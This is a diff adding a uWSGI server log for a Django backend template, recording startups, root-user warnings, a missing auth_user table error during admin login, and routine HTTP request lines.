@@ -1,0 +1,1060 @@
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 05:23:27 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x55fae21190a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55fae21190a0 pid: 15889 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 15889)
+spawned uWSGI worker 1 (pid: 15891, cores: 2)
+spawned uWSGI worker 2 (pid: 15892, cores: 2)
+[pid: 15892|app: 0|req: 1/1] 61.191.198.244 () {42 vars in 715 bytes} [Wed Nov 28 13:24:22 2018] GET /admin => generated 0 bytes in 45 msecs (HTTP/1.1 301) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 15892|app: 0|req: 2/2] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 13:24:22 2018] GET /admin/ => generated 0 bytes in 43 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 3/3] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 13:24:23 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 141 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /static/admin/css/base.css
+[pid: 15892|app: 0|req: 4/4] 61.191.198.244 () {42 vars in 735 bytes} [Wed Nov 28 13:24:23 2018] GET /static/admin/css/base.css => generated 2935 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /static/admin/css/login.css
+[pid: 15892|app: 0|req: 5/5] 61.191.198.244 () {42 vars in 737 bytes} [Wed Nov 28 13:24:23 2018] GET /static/admin/css/login.css => generated 2938 bytes in 18 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /static/admin/css/responsive.css
+[pid: 15891|app: 0|req: 1/6] 61.191.198.244 () {42 vars in 747 bytes} [Wed Nov 28 13:24:23 2018] GET /static/admin/css/responsive.css => generated 2953 bytes in 70 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 6/7] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 13:24:24 2018] GET /favicon.ico => generated 2893 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15891|app: 0|req: 2/8] 61.191.198.244 () {44 vars in 777 bytes} [Wed Nov 28 13:24:42 2018] GET /admin/ => generated 0 bytes in 38 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 7/9] 61.191.198.244 () {44 vars in 814 bytes} [Wed Nov 28 13:24:42 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 66 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /static/admin/css/base.css
+[pid: 15892|app: 0|req: 8/10] 61.191.198.244 () {42 vars in 735 bytes} [Wed Nov 28 13:24:43 2018] GET /static/admin/css/base.css => generated 2935 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /static/admin/css/login.css
+Not Found: /static/admin/css/responsive.css
+[pid: 15891|app: 0|req: 4/11] 61.191.198.244 () {42 vars in 747 bytes} [Wed Nov 28 13:24:43 2018] GET /static/admin/css/responsive.css => generated 2953 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15891|app: 0|req: 4/12] 61.191.198.244 () {42 vars in 737 bytes} [Wed Nov 28 13:24:43 2018] GET /static/admin/css/login.css => generated 2938 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 9/13] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 13:24:43 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Internal Server Error: /admin/login/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/sqlite3/base.py", line 296, in execute
+    return Database.Cursor.execute(self, query, params)
+sqlite3.OperationalError: no such table: auth_user
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
+    response = view_func(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/admin/sites.py", line 398, in login
+    return LoginView.as_view(**defaults)(request)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/utils/decorators.py", line 45, in _wrapper
+    return bound_method(*args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/debug.py", line 76, in sensitive_post_parameters_wrapper
+    return view(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/utils/decorators.py", line 45, in _wrapper
+    return bound_method(*args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/utils/decorators.py", line 142, in _wrapped_view
+    response = view_func(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/utils/decorators.py", line 45, in _wrapper
+    return bound_method(*args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/cache.py", line 44, in _wrapped_view_func
+    response = view_func(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/auth/views.py", line 61, in dispatch
+    return super().dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/generic/base.py", line 88, in dispatch
+    return handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/views/generic/edit.py", line 141, in post
+    if form.is_valid():
+  File "/usr/local/lib/python3.6/dist-packages/django/forms/forms.py", line 185, in is_valid
+    return self.is_bound and not self.errors
+  File "/usr/local/lib/python3.6/dist-packages/django/forms/forms.py", line 180, in errors
+    self.full_clean()
+  File "/usr/local/lib/python3.6/dist-packages/django/forms/forms.py", line 382, in full_clean
+    self._clean_form()
+  File "/usr/local/lib/python3.6/dist-packages/django/forms/forms.py", line 409, in _clean_form
+    cleaned_data = self.clean()
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/auth/forms.py", line 196, in clean
+    self.user_cache = authenticate(self.request, username=username, password=password)
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/auth/__init__.py", line 73, in authenticate
+    user = backend.authenticate(request, **credentials)
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/auth/backends.py", line 16, in authenticate
+    user = UserModel._default_manager.get_by_natural_key(username)
+  File "/usr/local/lib/python3.6/dist-packages/django/contrib/auth/base_user.py", line 44, in get_by_natural_key
+    return self.get(**{self.model.USERNAME_FIELD: username})
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/query.py", line 393, in get
+    num = len(clone)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/query.py", line 250, in __len__
+    self._fetch_all()
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/query.py", line 1186, in _fetch_all
+    self._result_cache = list(self._iterable_class(self))
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/query.py", line 54, in __iter__
+    results = compiler.execute_sql(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/models/sql/compiler.py", line 1065, in execute_sql
+    cursor.execute(sql, params)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 100, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 68, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 77, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/utils.py", line 89, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/utils.py", line 85, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib/python3.6/dist-packages/django/db/backends/sqlite3/base.py", line 296, in execute
+    return Database.Cursor.execute(self, query, params)
+django.db.utils.OperationalError: no such table: auth_user
+[pid: 15892|app: 0|req: 10/14] 61.191.198.244 () {48 vars in 931 bytes} [Wed Nov 28 13:25:15 2018] POST /admin/login/?next=/admin/ => generated 218535 bytes in 182 msecs (HTTP/1.1 500) 4 headers in 138 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 11/15] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 13:25:16 2018] GET /favicon.ico => generated 2893 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15892|app: 0|req: 12/16] 61.191.198.244 () {44 vars in 814 bytes} [Wed Nov 28 13:28:21 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 27 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /
+[pid: 15892|app: 0|req: 13/17] 41.223.155.62 () {32 vars in 457 bytes} [Wed Nov 28 13:38:41 2018] GET / => generated 2845 bytes in 13 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /admin/assets/js/views/login.js
+[pid: 15891|app: 0|req: 5/18] 87.251.81.86 () {36 vars in 485 bytes} [Wed Nov 28 13:56:50 2018] GET /admin/assets/js/views/login.js => generated 5576 bytes in 60 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15892|app: 0|req: 14/19] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:11:05 2018] GET /admin/ => generated 0 bytes in 10 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 15891|app: 0|req: 6/20] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 14:11:05 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 157 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /static/admin/css/base.css
+[pid: 15892|app: 0|req: 15/21] 61.191.198.244 () {42 vars in 735 bytes} [Wed Nov 28 14:11:06 2018] GET /static/admin/css/base.css => generated 2935 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /static/admin/css/responsive.css
+[pid: 15892|app: 0|req: 16/22] 61.191.198.244 () {42 vars in 747 bytes} [Wed Nov 28 14:11:06 2018] GET /static/admin/css/responsive.css => generated 2953 bytes in 15 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /static/admin/css/login.css
+[pid: 15891|app: 0|req: 7/23] 61.191.198.244 () {42 vars in 737 bytes} [Wed Nov 28 14:11:06 2018] GET /static/admin/css/login.css => generated 2938 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15891|app: 0|req: 8/24] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:11:06 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /admin/static
+[pid: 15892|app: 0|req: 17/25] 61.191.198.244 () {42 vars in 729 bytes} [Wed Nov 28 14:14:37 2018] GET /admin/static => generated 5522 bytes in 18 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 18/26] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:14:37 2018] GET /favicon.ico => generated 2893 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:19:04 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (127.0.0.1:9090).
+bind(): Address already in use [core/socket.c line 769]
+Not Found: /admin/static
+[pid: 15892|app: 0|req: 19/27] 61.191.198.244 () {42 vars in 729 bytes} [Wed Nov 28 14:19:14 2018] GET /admin/static => generated 5522 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 20/28] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:19:15 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 21/29] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:19:17 2018] GET /admin/ => generated 0 bytes in 3 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 0)
+[pid: 15891|app: 0|req: 9/30] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 14:19:18 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 89 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /static/admin/css/login.css
+Not Found: /static/admin/css/base.css
+[pid: 15891|app: 0|req: 10/31] 61.191.198.244 () {42 vars in 737 bytes} [Wed Nov 28 14:19:18 2018] GET /static/admin/css/login.css => generated 2938 bytes in 18 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 22/32] 61.191.198.244 () {42 vars in 735 bytes} [Wed Nov 28 14:19:18 2018] GET /static/admin/css/base.css => generated 2935 bytes in 22 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /static/admin/css/responsive.css
+[pid: 15892|app: 0|req: 23/33] 61.191.198.244 () {42 vars in 747 bytes} [Wed Nov 28 14:19:18 2018] GET /static/admin/css/responsive.css => generated 2953 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 24/34] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:19:18 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 25/35] 61.191.198.244 () {46 vars in 845 bytes} [Wed Nov 28 14:23:45 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 48 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /static/admin/css/base.css
+[pid: 15892|app: 0|req: 26/36] 61.191.198.244 () {44 vars in 766 bytes} [Wed Nov 28 14:23:48 2018] GET /static/admin/css/base.css => generated 2935 bytes in 22 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /static/admin/css/login.css
+[pid: 15891|app: 0|req: 11/37] 61.191.198.244 () {44 vars in 768 bytes} [Wed Nov 28 14:23:48 2018] GET /static/admin/css/login.css => generated 2938 bytes in 20 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /static/admin/css/responsive.css
+[pid: 15891|app: 0|req: 12/38] 61.191.198.244 () {44 vars in 778 bytes} [Wed Nov 28 14:23:48 2018] GET /static/admin/css/responsive.css => generated 2953 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 27/39] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:23:48 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15892|app: 0|req: 28/40] 61.191.198.244 () {46 vars in 845 bytes} [Wed Nov 28 14:24:23 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 32 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 29/41] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:24:24 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /
+[pid: 15892|app: 0|req: 30/42] 185.153.198.206 () {38 vars in 488 bytes} [Wed Nov 28 14:25:31 2018] POST / => generated 2847 bytes in 20 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15892|app: 0|req: 31/43] 61.191.198.244 () {46 vars in 845 bytes} [Wed Nov 28 14:26:31 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 40 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 32/44] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:26:32 2018] GET /favicon.ico => generated 2893 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:30:48 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+probably another instance of uWSGI is running on the same address (127.0.0.1:9090).
+bind(): Address already in use [core/socket.c line 769]
+[pid: 15892|app: 0|req: 33/45] 61.191.198.244 () {46 vars in 845 bytes} [Wed Nov 28 14:31:02 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 25 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 34/46] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:31:02 2018] GET /favicon.ico => generated 2893 bytes in 5 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+[pid: 15891|app: 0|req: 13/47] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:31:08 2018] GET /admin/ => generated 0 bytes in 7 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 0)
+[pid: 15891|app: 0|req: 14/48] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 14:31:09 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 35 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 35/49] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:31:09 2018] GET /favicon.ico => generated 2893 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15892|app: 0|req: 36/50] 61.191.198.244 () {42 vars in 729 bytes} [Wed Nov 28 14:31:17 2018] GET /admin/login/ => generated 1808 bytes in 22 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15892|app: 0|req: 37/51] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:31:18 2018] GET /favicon.ico => generated 2893 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Not Found: /
+[pid: 15892|app: 0|req: 38/52] 61.191.198.244 () {46 vars in 798 bytes} [Wed Nov 28 14:31:20 2018] GET / => generated 2842 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 1)
+Not Found: /favicon.ico
+[pid: 15891|app: 0|req: 15/53] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:31:21 2018] GET /favicon.ico => generated 2893 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+[pid: 15891|app: 0|req: 16/54] 61.191.198.244 () {42 vars in 729 bytes} [Wed Nov 28 14:31:25 2018] GET /admin/login/ => generated 1808 bytes in 33 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+Not Found: /
+[pid: 15892|app: 0|req: 39/55] 178.62.233.191 () {34 vars in 388 bytes} [Wed Nov 28 14:34:10 2018] GET / => generated 2842 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 116 bytes (1 switches on core 0)
+Wed Nov 28 14:37:16 2018 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:37:16 2018 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:37:16 2018 - uWSGI worker 2 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Nov 28 14:37:16 2018 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.17.1 (64bit) on [Wed Nov 28 06:38:39 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /home/wwww/django-backend-template
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x55c6d78de0a0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55c6d78de0a0 pid: 28835 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28835)
+spawned uWSGI worker 1 (pid: 28837, cores: 2)
+spawned uWSGI worker 2 (pid: 28838, cores: 2)
+[pid: 28837|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 760 bytes} [Wed Nov 28 14:38:51 2018] GET /admin/login/ => generated 1808 bytes in 179 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 2/2] 61.191.198.244 () {42 vars in 723 bytes} [Wed Nov 28 14:38:51 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28838|app: 0|req: 1/3] 190.141.218.196 () {28 vars in 299 bytes} [Wed Nov 28 14:38:54 2018] GET / => generated 74 bytes in 41 msecs (HTTP/1.0 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 28838|app: 0|req: 2/4] 61.191.198.244 () {42 vars in 705 bytes} [Wed Nov 28 14:39:02 2018] GET / => generated 74 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 3/5] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:39:03 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 4/6] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:39:09 2018] GET /admin/ => generated 0 bytes in 7 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 5/7] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 14:39:10 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 11 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 6/8] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:39:10 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28838|app: 0|req: 3/9] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:39:15 2018] GET /admin2 => generated 80 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 28838|app: 0|req: 4/10] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:39:16 2018] GET /favicon.ico => generated 85 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 28838|app: 0|req: 5/11] 61.191.198.244 () {42 vars in 717 bytes} [Wed Nov 28 14:39:22 2018] GET /admin/ => generated 0 bytes in 43 msecs (HTTP/1.1 302) 7 headers in 273 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 7/12] 61.191.198.244 () {42 vars in 754 bytes} [Wed Nov 28 14:39:22 2018] GET /admin/login/?next=/admin/ => generated 1821 bytes in 9 msecs (HTTP/1.1 200) 7 headers in 403 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 8/13] 61.191.198.244 () {40 vars in 692 bytes} [Wed Nov 28 14:39:22 2018] GET /favicon.ico => generated 85 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 28837|app: 0|req: 9/14] 61.191.198.244 () {48 vars in 931 bytes} [Wed Nov 28 14:40:45 2018] POST /admin/login/?next=/admin/ => generated 0 bytes in 253 msecs (HTTP/1.1 302) 9 headers in 567 bytes (1 switches on core 1)
+[pid: 28837|app: 0|req: 10/15] 61.191.198.244 () {44 vars in 821 bytes} [Wed Nov 28 14:40:45 2018] GET /admin/ => generated 8150 bytes in 34 msecs (HTTP/1.1 200) 6 headers in 235 bytes (1 switches on core 0)
